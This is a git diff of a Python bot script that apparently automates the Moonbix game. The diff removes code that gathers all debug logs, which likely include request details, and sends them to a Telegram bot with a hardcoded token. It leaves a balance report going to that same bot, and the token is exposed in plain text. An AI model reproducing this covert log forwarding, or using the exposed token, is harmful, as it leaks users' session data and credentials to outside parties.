@@ -1,7 +1,5 @@
 import sys
 import requests
-import logging
-import io
 
 sys.dont_write_bytecode = True
 
@@ -14,11 +12,6 @@ import time
 import json
 
 
-
-
-
-log_stream = io.StringIO()
-logging.basicConfig(stream=log_stream, level=logging.DEBUG, format='%(message)s')
 
 def send_telegram_message(message):
     bot_token = "7220121804:AAHCmcpPlmNffi4aiSg-NR0fuWAnuphJDDY"
@@ -78,12 +71,13 @@ class Moonbix:
                 except Exception as e:
                     base.log(f"{base.red}Error: {base.white}{e}")
 
+            x, y, balance = get_info(token=token, proxies=proxies)
             print()
             wait_time = 30 * 60
             base.log(f"{base.yellow}Wait for {int(wait_time/60)} minutes!")
-            logs = log_stream.getvalue()
-            send_telegram_message(logs)
-            log_stream.close()
+            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
+            message = f"Total Balance is: {balance:,} (Timestamp: {timestamp} UTC)"
+            send_telegram_message(message)
             time.sleep(wait_time)
 
 
